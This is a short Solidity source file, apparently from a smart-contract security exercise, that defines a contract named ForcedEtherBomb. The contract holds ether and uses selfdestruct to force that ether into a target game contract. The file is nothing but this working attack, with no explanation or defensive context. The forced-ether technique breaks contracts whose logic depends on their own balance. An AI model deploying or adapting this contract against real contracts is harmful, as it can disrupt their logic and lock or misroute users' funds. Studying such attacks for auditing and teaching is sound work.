// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

contract ForcedEtherBomb {


receive() external payable { 
   
}

function blast(address gameAddress) external {
    selfdestruct(payable(gameAddress));
    
}
}